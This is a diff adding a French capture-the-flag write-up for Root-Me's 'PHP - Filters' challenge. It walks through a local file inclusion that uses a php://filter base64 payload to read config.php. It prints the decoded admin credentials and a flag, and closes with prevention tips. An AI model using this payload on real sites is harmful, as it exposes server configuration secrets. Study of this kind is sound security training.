@@ -326,3 +326,67 @@ Passer ce niveau est très facile. Utilisez le même shell que précédemment. I
 Flag : `YPNchi2NmTwygr2dgCCF`
 
 ---
+
+# 34 : PHP - Filters
+
+## Introduction
+Dans ce challenge, nous exploitons une vulnérabilité d'inclusion de fichier en utilisant le filtre `php://filter` afin de récupérer des informations sensibles stockées dans un fichier de configuration.
+
+## Étape 1 : Identification du paramètre vulnérable
+Le paramètre `inc` est utilisé pour inclure dynamiquement un fichier via `include` ou `require`. Si aucune validation n'est effectuée, il est possible d'inclure des fichiers arbitraires présents sur le serveur.
+
+Exemple d'URL vulnérable :
+```plaintext
+http://www.root-me.org/challenge/web-serveur/ch12/?inc=config.php
+```
+
+## Étape 2 : Exploitation avec `php://filter`
+Plutôt que d'exécuter le fichier PHP, ce qui empêcherait d'afficher son contenu, nous pouvons l'encoder en Base64 pour le récupérer sous forme lisible.
+
+Nous utilisons l'URL suivante :
+```plaintext
+http://www.root-me.org/challenge/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php
+```
+Cette requête encode le contenu du fichier `config.php` en Base64 et nous renvoie une chaîne de caractères.
+
+## Étape 3 : Décodage de la réponse
+Supposons que nous obtenons la réponse suivante :
+```plaintext
+PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==
+```
+Nous pouvons la décoder en utilisant la commande suivante en terminal Linux :
+```bash
+echo 'PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==' | base64 -d
+```
+
+Le résultat est :
+```php
+<?php
+
+$username="admin";
+$password="DAPt9D2mky0APAF";
+
+?>
+```
+
+## Étape 4 : Utilisation des identifiants
+Nous pouvons maintenant utiliser ce couple identifiant/mot de passe pour nous connecter. Une fois authentifiés, nous validons le challenge avec le message :
+```plaintext
+To validate the challenge use this password
+```
+
+## Prévention de cette vulnérabilité
+Cette vulnérabilité est due à un manque de validation des entrées utilisateur. Pour s'en prémunir, voici quelques bonnes pratiques :
+- **Utiliser une whitelist de fichiers autorisés**
+- **Restreindre l'accès aux fichiers sensibles** (via `chmod` ou `.htaccess`)
+- **Désactiver `allow_url_include` et `allow_url_fopen` dans `php.ini`**
+- **Ne jamais inclure un fichier basé directement sur une entrée utilisateur sans validation stricte**
+
+## Références
+- [Documentation PHP sur les wrappers](http://php.net/manual/en/wrappers.php.php)
+
+---
+
+Cette technique est couramment utilisée dans les challenges CTF et les tests d'intrusion web. 🚀
+
+
